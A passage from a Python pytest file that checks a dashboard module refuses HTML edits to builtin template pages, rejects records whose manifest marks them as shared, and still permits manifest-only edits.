        """The cheap check is kept: a record that never went through adopt.

        It is not the gate any more -- the catalog is -- but it costs nothing and
        turns away a record whose own label already says it must not run.
        """
        instance.adopt(SLUG, "fixture-board", session_id="")
        record = instance.read(SLUG)
        object.__setattr__(record, "manifest", {**dict(record.manifest), "source": "shared"})
        assert routes._trusted_page(SLUG, record) is None


class TestAStoredPageCannotBeEdited:
    """`edit` kept the template id and version while replacing the page.

    That made a record saying `builtin` over bytes nobody reviewed -- the same hole
    from the writer's side rather than the reader's.
    """

    def test_an_html_edit_on_a_builtin_is_refused(self) -> None:
        instance.adopt(SLUG, "fixture-board", session_id="")
        with pytest.raises(instance.InstanceRefused) as refused:
            instance.edit(SLUG, html=PAGE_EDITED, session_id="")
        assert str(refused.value) == instance.EDITED_PAGE_REFUSAL
        assert "cannot be edited" in str(refused.value)
        # NOTHING was written: no new version, and the page on disk is untouched.
        after = instance.read(SLUG)
        assert after.instance_version == 1
        assert after.html == PAGE

    def test_the_refusal_names_what_to_do_instead(self) -> None:
        """A caller that cannot edit the page has to be told where pages come from."""
        for needle in ("dashboard_templates", "dashboard_rollback", "manifest alone"):
            assert needle in instance.EDITED_PAGE_REFUSAL, needle

    def test_an_html_edit_is_refused_even_beside_a_manifest(self) -> None:
        """The pair is not a loophole: the page half still decides."""
        instance.adopt(SLUG, "fixture-board", session_id="")
        with pytest.raises(instance.InstanceRefused):
            instance.edit(SLUG, html=PAGE_EDITED, manifest=_manifest(), session_id="")
        assert instance.read(SLUG).instance_version == 1

    def test_a_manifest_only_edit_is_still_allowed(self) -> None:
        """It can name fields and fold paths, so the worst it draws is an empty cell.

        And the parity rule refuses even that, so the capability stays.
        """
        instance.adopt(SLUG, "fixture-board", session_id="")
        edited = instance.edit(SLUG, manifest={**_manifest(), "title": "Retitled"}, session_id="")
        assert edited.instance_version == 2
        assert edited.manifest["title"] == "Retitled"
        assert edited.html == PAGE, "a manifest edit moved the page"
